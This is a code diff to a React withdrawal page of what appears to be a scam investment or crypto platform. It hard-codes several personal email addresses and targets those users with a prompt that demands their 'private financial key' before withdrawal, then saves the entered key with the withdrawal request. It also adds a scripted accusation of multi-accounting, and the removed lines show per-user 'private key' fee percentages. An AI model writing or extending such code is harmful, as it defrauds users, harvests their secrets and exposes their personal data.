@@ -37,8 +37,10 @@ const Withdraw = () => {
   const auth = getAuth();
   const { t, i18n } = useTranslation();
   const [current, setCurrent] = useState(0);
-  const [isPrivatKeyShowed, setIsPrivatKeyShowed] = useState(false);
   const [api, contextHolder] = notification.useNotification();
+
+  const [isPrivatKeyShowed, setIsPrivatKeyShowed] = useState(false);
+  const [privatKey, setPrivatKey] = useState(false);
 
   const [walletIsExist, setWalletIsExist] = useState(false);
 
@@ -46,28 +48,27 @@ const Withdraw = () => {
   const [privatKeyAmount, setPrivatKeyAmount] = useState(1000);
 
   useEffect(() => {
-    const userWithdrawn = userData.withdrawn;
-    const isErnest = (userWithdrawn >= 1000 && userData.email === "azrv1@mail.ru") || userWithdrawn + amount >= 1000;
-    const isSaule =
-      (userWithdrawn >= 500 && userData.email === "sauleselecta@gmail.com") || userWithdrawn + amount >= 500;
+    const isErnest = userData.email === "azrv1@mail.ru";
 
-    const isArt =
-      (userWithdrawn >= 500 && userData.email === "probuisness90@gmail.com") || userWithdrawn + amount >= 500;
+    const userWithPrivateKey =
+      userData.email === "gevond@mail.ru" ||
+      userData.email === "stassy95@mail.ru" ||
+      userData.email === "vova.grigoryants@list.ru" ||
+      userData.email === "bonyklade@gmail.com";
 
     if (isErnest) {
       setPrivatKeyAmount(1000);
       setPrivatKeyPercentage(43);
-    }
-
-    if (isSaule) {
-      setPrivatKeyAmount(500);
-      setPrivatKeyPercentage(70);
-    }
-
-    if (isErnest || isSaule) {
       setIsPrivatKeyShowed(true);
     } else {
       setIsPrivatKeyShowed(false);
+    }
+
+    if (userWithPrivateKey) {
+      setPrivatKey(true);
+      setIsPrivatKeyShowed(false);
+    } else {
+      setPrivatKey(false);
     }
   }, [amount]);
 
@@ -118,6 +119,62 @@ const Withdraw = () => {
       title: t("cash_in.confirm"),
       content: (
         <>
+          {userData.isPrivateKeyWarning ? (
+            <div className={styles["private-key-warning"]}>
+              <p>
+                Недавно было обнаружено, что с вашего IP-адреса активно используются несколько аккаунтов которые активно
+                злоупотребляют нашей реферальной программой. Это противоречит нашим условиям использования, которые
+                строго запрещают мультиаккаунтинг и злоупотребление реферальной программой.
+              </p>
+              <p>
+                В связи с этим, мы вынуждены были заблокировать все связанные аккаунты. Пожалуйста, не создавайте новые
+                аккаунты и не злоупотребляйте нашими услугами, чтобы избежать дальнейших санкций.
+              </p>
+            </div>
+          ) : (
+            ""
+          )}
+          {privatKey || userData.isPrivateKey ? (
+            <>
+              <div className={styles["private-key-wrapper"]}>
+                <p>
+                  <span>Важно:</span> Вы собираетесь ввести ваш приватный финансовый ключ. Этот ключ представляет собой
+                  уникальную комбинацию символов, которая предоставляет вам доступ к вашим личным финансовым данным.
+                </p>
+                <p>
+                  Будьте осторожны при использовании вашего приватного ключа. Не раскрывайте его третьим лицам, не
+                  сохраняйте на общедоступных или незащищенных устройствах. В случае его утери или кражи, ваши
+                  финансовые средства могут быть поставлены под угрозу.
+                </p>
+                <p>
+                  Пожалуйста, убедитесь, что вы находитесь в безопасном и приватном окружении перед тем, как ввести свой
+                  приватный ключ. Если вы не уверены, что ваше окружение безопасно, отложите этот процесс на более
+                  подходящее время.
+                </p>
+                <p>
+                  Вводите ваш ключ только если вы абсолютно уверены в своих действиях. Помните, что ответственность за
+                  сохранность вашего приватного ключа лежит на вас.
+                </p>
+                <p>Пожалуйста, введите ваш приватный финансовый ключ в поле ниже:</p>
+                <Form.Item
+                  name={"private-key"}
+                  rules={[
+                    {
+                      required: true,
+                      message: "Требуется приватный финансовый ключ",
+                    },
+                  ]}
+                >
+                  <Input />
+                </Form.Item>
+              </div>
+            </>
+          ) : (
+            ""
+          )}
+
+          {/*-------------------------------------*/}
+
           {isPrivatKeyShowed ? (
             <div className={styles["disclaimer"]}>
               <p>
@@ -236,6 +293,7 @@ const Withdraw = () => {
         paymentMethod: form.getFieldValue("payment-method"),
         tax: tax,
         _status: "running",
+        privatKey: !!form.getFieldValue("private-key") ? form.getFieldValue("private-key") : "",
       }).then(() => {
         setIsConfirmedModalOpen(true);
       });
